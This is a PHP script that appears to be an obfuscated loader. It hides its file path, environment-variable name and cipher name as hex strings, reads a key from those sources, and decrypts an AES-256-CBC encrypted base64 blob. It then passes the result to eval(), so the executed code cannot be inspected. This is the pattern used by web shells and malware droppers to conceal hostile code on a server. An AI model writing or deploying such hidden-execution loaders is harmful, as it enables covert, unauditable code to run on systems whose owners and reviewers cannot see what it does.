<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ZfrB1eUZAAwSI24EwYUcCg==');

$c=base64_decode(

'3aeuJFJfPyMFhi04UPkzL0mIIgQhR6i6osm9YGiz2nR2bqcqGA9fJ2KfCcBcN4ww2fjW3EszERNZ' .
'eGFKt2Zl0mn9IV9B729+IuvQccnKhxTfgrl49kZVKjKZVYDQ/mx3EdF0PJweAqBzkOjG9jM7HZ+y' .
'nAse4hLt4nA15dxac3PKEJYZw1/LdwCGDpQPMfiH29SSQk3jcykO6UGoHGhITc0R1ZOa1eepiy26' .
'IUh/sOTHMdp2uxjAt2QtOGECMxZZefFdD3tSw29hmaFX67ayVMnChqeEQlPPQw9EtFzzKg2itIqU' .
'XLBzcssLvK9mulLzzh3xWs18bJVU7v54TaP8jIQKMer74fl8whRdmtzUOjSBYtsGS34inNWKORvy' .
'K4CnPqvbTcb/K7SYhzorQ6oMSB7cBMlDzGtcb1IloG9sSxBMGbYwSz67jbIZ09BWtuZbyRJXJadR' .
'goujqqAV9ZkUjDJ4dJ0NioDxCEY7ySii1WZX21j+uATVXVkc7rMCkosxtXv3AYSwaoZF1VTEkjLz' .
'9kzTBE2lhrd+EsVLgfRM6h+Pp3hWaxvsR6ZtsqiWlm/ptw+nueSPnPTditQ6reJLt/zgw04mu78H' .
'LxM7hHhMBZSnkMXnbfnOhWtjbO0CuUcLKab3gClGiA4Vk5TG9oxr6LvZufsdsNd8CJ4uE9Hoiynd' .
'dsVnEHo/mlvY4SF6hjwUTw7JlhYvUkdW5IXqduyuuzcZEmWpXy5JqN7gStbC5BvkT39i2bnHGzIY' .
'RJaZSOgBPVdijMrBrQlnoZKGbOifvPl3bBoqCabpbS48k7+/CS8vgwPUhuGkBEBB8QxhLVdr+Y2E' .
'0V+shceTR6ve1YniGXkFed+z/HR209LFLQe4S9sc4aKQWTrZ0FFtd3yzUX34pNf1Y9Ke8w/kP9+F' .
'TvIrVy/ppBV4CkJ3x6snYB6D320wx6FwO+VrstLnMz590iwk1aulkXgaD5RYXORrvwQnA/gDPoBm' .
'PlUFEGG5YikkVjEodIEW9NQsAsREEo11QBLLCj2K5FX9MBgNwVQlZPHbHyZpHgU2Q4g83Nz537qu' .
'BXXfG4ykAUhdWo6znrnAJNUUMOdVzcDanG8vAhl5OgSjqw4cQcmM+C+OdGjJqdaiLyjt/5HCL/r6' .
'N5JnX3IOj3X4mwp6+PPYKi9bjYvdPtpW4ihe+HIv1C1nk1j4Wb8KjwKhZ0/cOifvMybU3lS7qTfQ' .
'GXGieT03qrKtxCj6V0SocXqHRMxprCU1VhRZseIwiV2ypFGxW6f5//FqRzz3VzuODAxsIp7ANLRS' .
'eeHmEqtg8Px2iIiyNsTbOnSMKvGAkSS0iJeh2+gcMmgL7RI/S2toD2krf7XChUhXmNTd3a28Ow=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

